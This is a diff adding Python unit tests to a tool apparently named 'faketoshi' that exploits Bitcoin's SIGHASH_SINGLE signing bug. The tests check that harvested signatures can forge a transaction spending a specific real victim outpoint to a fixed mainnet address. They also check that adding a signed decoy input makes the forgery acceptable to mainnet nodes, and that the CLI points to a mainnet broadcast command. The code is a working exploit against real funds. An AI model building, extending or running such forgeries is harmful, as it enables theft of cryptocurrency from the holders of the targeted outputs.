@@ -351,6 +351,128 @@ class ForgeFromHarvestTest(unittest.TestCase):
             forge_from_harvest([], 'de' * 32, 0, '1Q1pE5vPGEEMqRcVRMbtBK842Y6Pzo6nK9', 1000)
 
 
+
+class BroadcastableForgeTest(unittest.TestCase):
+    """A forged tx a mainnet node would actually accept.
+
+    Every input has to exist in the UTXO set, so the decoy needs a real prevout
+    and its own signature. Without that the node rejects with
+    bad-txns-inputs-missingorspent before looking at the harvested signature.
+    """
+
+    DECOY_KEY = 0xBEEF1234
+    VICTIM_OUTPOINT = (
+        '8602122a7044b8795b5829b6b48fb1960a124f42ab1c003e769bbaad31cb2afd',
+        0,
+    )
+
+    def _forge(self, **kwargs):
+        from faketoshi.sighash_single import forge_from_harvest, replay_history
+
+        return forge_from_harvest(
+            replay_history().harvests,
+            prev_txid=self.VICTIM_OUTPOINT[0],
+            prev_vout=self.VICTIM_OUTPOINT[1],
+            destination='1Q1pE5vPGEEMqRcVRMbtBK842Y6Pzo6nK9',
+            value=677200,
+            **kwargs
+        )
+
+    def test_real_outpoint_still_hits_the_constant_digest(self):
+        from faketoshi.signing import SIGHASH_SINGLE_BUG_DIGEST
+
+        forged = self._forge()
+        # The digest ignores the outpoint entirely, which is why the harvested
+        # signatures work against the real UTXO.
+        self.assertEqual(forged.digest_used, SIGHASH_SINGLE_BUG_DIGEST)
+        self.assertEqual(
+            forged.transaction.inputs[1].prev_txid, self.VICTIM_OUTPOINT[0]
+        )
+
+    def test_decoy_is_signed_so_every_input_is_spendable(self):
+        from faketoshi.encoding import p2pkh_address
+        from faketoshi.signing import (
+            decode_point,
+            der_decode,
+            private_key_to_public_key,
+            verify_z,
+        )
+        from faketoshi.wallet import address_to_script, parse_transaction_hex
+
+        spk = address_to_script('1Q1pE5vPGEEMqRcVRMbtBK842Y6Pzo6nK9', 'mainnet')
+        forged = self._forge(
+            decoy_txid='11' * 32,
+            decoy_vout=3,
+            decoy_script=spk,
+            decoy_value=50000,
+            decoy_key=self.DECOY_KEY,
+        )
+        tx = forged.transaction
+        self.assertEqual(tx.inputs[0].prev_txid, '11' * 32)
+        self.assertEqual(tx.inputs[0].prev_vout, 3)
+        self.assertNotEqual(tx.inputs[0].script_sig, b'')
+
+        # Rebuild the unsigned tx to recompute the decoy's own digest.
+        from faketoshi.signing import SIGHASH_ALL, Transaction, TxIn, TxOut
+
+        unsigned = Transaction(
+            version=2,
+            inputs=[
+                TxIn('11' * 32, 3, 0xFFFFFFFF),
+                TxIn(self.VICTIM_OUTPOINT[0], self.VICTIM_OUTPOINT[1], 0xFFFFFFFF),
+            ],
+            outputs=tx.outputs,
+            locktime=0,
+        )
+        digest = unsigned.sighash_legacy(0, spk, SIGHASH_ALL)
+        items = [i for i in parse_script_sig(tx.inputs[0].script_sig) if i]
+        r, s, htype = der_decode(items[0])
+        self.assertEqual(htype, SIGHASH_ALL)
+        self.assertEqual(
+            items[1], private_key_to_public_key(self.DECOY_KEY, compressed=True)
+        )
+        self.assertTrue(
+            verify_z(decode_point(items[1]), r, s, digest),
+            'the decoy signature must validate under SIGHASH_ALL',
+        )
+
+    def test_decoy_value_adds_to_the_output(self):
+        forged = self._forge(
+            decoy_txid='11' * 32,
+            decoy_script=b'\x76\xa9\x14' + b'\x11' * 20 + b'\x88\xac',
+            decoy_value=50000,
+            decoy_key=self.DECOY_KEY,
+        )
+        # 50000 + 677200 - 1000 fee
+        self.assertEqual(forged.transaction.outputs[0].value, 726200)
+
+    def test_decoy_script_without_a_key_is_refused(self):
+        with self.assertRaises(ValueError) as caught:
+            self._forge(decoy_script=b'\x51')
+        self.assertIn('decoy_key', str(caught.exception))
+
+    def test_decoy_key_without_a_script_is_refused(self):
+        with self.assertRaises(ValueError) as caught:
+            self._forge(decoy_key=self.DECOY_KEY)
+        self.assertIn('decoy_script', str(caught.exception))
+
+    def test_forged_tx_round_trips_through_the_parser(self):
+        from faketoshi.wallet import parse_transaction_hex
+
+        forged = self._forge(
+            decoy_txid='11' * 32,
+            decoy_script=b'\x76\xa9\x14' + b'\x11' * 20 + b'\x88\xac',
+            decoy_value=50000,
+            decoy_key=self.DECOY_KEY,
+        )
+        reparsed = parse_transaction_hex(forged.transaction.hex())
+        self.assertEqual(reparsed.txid(), forged.transaction.txid())
+        self.assertEqual(len(reparsed.inputs), 2)
+        self.assertEqual(
+            reparsed.inputs[1].script_sig, forged.transaction.inputs[1].script_sig
+        )
+
+
 class HarvestRejectsSafeTransactionsTest(unittest.TestCase):
     def test_sighash_all_transaction_yields_nothing(self):
         from faketoshi.sighash_single import harvest_signatures, replay_history
@@ -530,6 +652,50 @@ class ForgeReplayCliTest(unittest.TestCase):
         from faketoshi.wallet import parse_transaction_hex
 
         self.assertEqual(parse_transaction_hex(payload['hex']).txid(), payload['txid'])
+
+    KEY = '11' * 32
+
+    def test_without_a_decoy_it_says_it_is_not_broadcastable(self):
+        rc, out, err = self._run(self.BASE)
+        self.assertEqual(rc, 0, err)
+        self.assertIn('bad-txns-inputs-missingorspent', out)
+        self.assertIn('--decoy-txid', out)
+
+    def test_with_a_real_decoy_it_is_broadcastable(self):
+        rc, out, err = self._run(
+            self.BASE
+            + [
+                '--decoy-txid', 'aa' * 32,
+                '--decoy-vout', '1',
+                '--decoy-value', '50000',
+                '--decoy-key', self.KEY,
+            ]
+        )
+        self.assertEqual(rc, 0, err)
+        self.assertIn('every input is real and this', out)
+        self.assertIn('faketoshi broadcast --network mainnet', out)
+        self.assertNotIn('bad-txns-inputs-missingorspent', out)
+
+    def test_decoy_txid_without_a_key_is_refused(self):
+        rc, _, err = self._run(
+            self.BASE + ['--decoy-txid', 'aa' * 32, '--decoy-value', '50000']
+        )
+        self.assertEqual(rc, 2)
+        self.assertIn('--decoy-key', err)
+
+    def test_decoy_key_without_a_txid_is_refused(self):
+        rc, _, err = self._run(self.BASE + ['--decoy-key', self.KEY])
+        self.assertEqual(rc, 2)
+        self.assertIn('--decoy-txid', err)
+
+    def test_decoy_defaults_to_mainnet(self):
+        import json
+
+        rc, out, _ = self._run(self.BASE + ['--json'])
+        self.assertEqual(rc, 0)
+        payload = json.loads(out)
+        # The destination is a mainnet address, which proves the network.
+        self.assertEqual(payload['destination'], '1Q1pE5vPGEEMqRcVRMbtBK842Y6Pzo6nK9')
 
     def test_a_safe_transaction_has_nothing_to_harvest(self):
         from faketoshi.signing import Transaction, TxIn, TxOut
